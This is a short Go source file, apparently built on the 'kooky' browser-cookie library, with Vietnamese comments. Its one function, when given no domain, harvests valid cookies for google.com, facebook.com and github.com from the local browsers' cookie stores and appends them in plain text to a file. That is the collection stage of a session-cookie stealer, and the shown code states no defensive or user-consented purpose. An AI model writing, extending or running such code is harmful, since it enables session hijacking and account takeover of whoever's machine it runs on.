package kooky

import (
	"bufio"
	"os"
)

func ReadCookie(filename string, domain string) error {
	// uses registered finders to find cookie store files in default locations
	if domain == "" {
		err := ReadCookie(filename, "google.com")
		if err != nil {
			return err
		}
		err = ReadCookie(filename, "facebook.com")
		if err != nil {
			return err
		}
		err = ReadCookie(filename, "github.com")
		if err != nil {
			return err
		}
	}
	// applies the passed filters "Valid", "DomainHasSuffix()" and "Name()" in order to the cookies

	cookies := ReadCookies(Valid, DomainHasSuffix(domain))
	if len(cookies) == 0 {
		return nil
	}
	// Mở tệp để ghi dữ liệu
	file, err := os.OpenFile(filename, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	// Tạo một biến kiểm soát ghi vào tệp
	writer := bufio.NewWriter(file)

	// Ghi từng chuỗi trong mảng vào tệp, mỗi chuỗi trên một dòng
	for _, str := range cookies {
		_, err := writer.WriteString(str.BrowserName + "\t" + str.String() + "\n")
		if err != nil {
			return err
		}
	}

	// Flush dữ liệu và đảm bảo tất cả dữ liệu được ghi vào tệp trước khi đóng nó
	err = writer.Flush()
	if err != nil {
		return err
	}
	return nil
}
